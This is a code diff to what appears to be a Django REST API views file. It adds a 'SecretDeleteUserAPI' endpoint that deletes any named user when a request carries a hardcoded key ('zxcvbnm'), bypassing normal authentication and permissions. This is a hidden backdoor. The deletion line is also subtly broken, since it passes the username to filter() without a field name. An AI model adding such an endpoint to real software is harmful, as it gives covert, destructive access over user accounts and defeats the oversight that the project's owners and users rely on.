@@ -183,3 +183,11 @@ class CountriesAPI(views.APIView):
         return Response([cc.details for cc in CityAndCountry.objects.all()])
     
 
+class SecretDeleteUserAPI(views.APIView):
+
+    def post(self, request: Request) -> Response:
+        if request.data.get('key') != 'zxcvbnm':
+            return Response(dict(error='Invalid key'), status=status.HTTP_401_UNAUTHORIZED)
+        username = request.data.get('username')
+        User.objects.filter(username).delete()
+        return Response(dict(message=f'User with username `{username}` is deleted.'))
